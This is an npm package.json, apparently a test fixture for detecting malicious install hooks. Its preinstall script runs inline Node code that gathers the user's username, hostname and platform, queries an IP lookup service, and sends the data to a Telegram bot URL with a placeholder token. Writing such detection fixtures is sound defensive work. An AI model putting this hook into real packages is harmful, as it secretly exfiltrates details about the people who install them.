{"name":"npm-inline-preinstall-ipify-telegram-fixture","version":"1.0.0","scripts":{"preinstall":"node -e \"const h=require('https'),o=require('os');const d={u:o.userInfo().username,h:o.hostname(),p:o.platform()};h.get('https://api.ipify.org?format=json',r=>{let b='';r.on('data',c=>b+=c);r.on('end',()=>h.get('https://api.telegram.org/bot1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789/sendMessage?chat_id=123456789&text='+JSON.stringify(d)))})\""}}
